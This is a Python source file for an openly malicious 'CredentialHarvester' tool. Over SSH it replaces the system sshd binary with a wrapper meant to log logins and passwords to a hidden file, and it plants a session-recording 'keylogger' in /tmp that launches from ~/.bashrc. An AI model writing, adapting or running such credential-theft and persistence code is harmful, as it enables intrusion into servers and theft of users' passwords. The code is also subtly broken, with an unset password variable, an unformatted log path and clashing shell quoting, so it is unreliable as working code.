import os
from paramiko import SSHClient
from typing import Optional

class CredentialHarvester:
    """Credential harvesting module using SSH wrapper and keylogging"""

    def __init__(self, ssh_client: SSHClient):
        self.ssh = ssh_client

    def execute(self, command: str) -> Optional[str]:
        """Execute command and return output"""
        try:
            _, stdout, stderr = self.ssh.exec_command(command)
            return stdout.read().decode().strip()
        except Exception:
            return None

    def install_ssh_wrapper(self) -> bool:
        """Install SSH wrapper script to capture credentials"""
        try:
            # Backup original SSH binary
            self.execute("cp /usr/sbin/sshd /usr/sbin/sshd.bak")

            # Create wrapper script content
            wrapper_script = '''#!/bin/sh
echo "SSH Login: $USER@$(hostname) with password: $PASSWORD" >> /var/log/.ssh.log
exec /usr/sbin/sshd.bak "$@"
'''

            # Write wrapper script to /usr/sbin/sshd
            self.execute(f"echo '{wrapper_script}' > /usr/sbin/sshd")
            self.execute("chmod +x /usr/sbin/sshd")

            # Restart SSH service to apply wrapper
            self.execute("systemctl restart sshd || service ssh restart")

            return True
        except Exception:
            return False

    def install_keylogger(self, log_path: str = "/var/log/.ssh_keylog.log") -> bool:
        """Install a simple keylogger for SSH sessions"""
        try:
            # This is a placeholder for a keylogger installation
            # Real keylogger implementation would require more complex setup
            keylogger_script = '''#!/bin/bash
# Simple keylogger placeholder
# Logs keystrokes to a file
script -q -f -c "bash" {log_path}
'''

            self.execute(f"echo '{keylogger_script}' > /tmp/ssh_keylogger.sh")
            self.execute("chmod +x /tmp/ssh_keylogger.sh")

            # Setup to run keylogger on SSH login (e.g., via .bashrc)
            self.execute(f"echo '/tmp/ssh_keylogger.sh &' >> ~/.bashrc")

            return True
        except Exception:
            return False
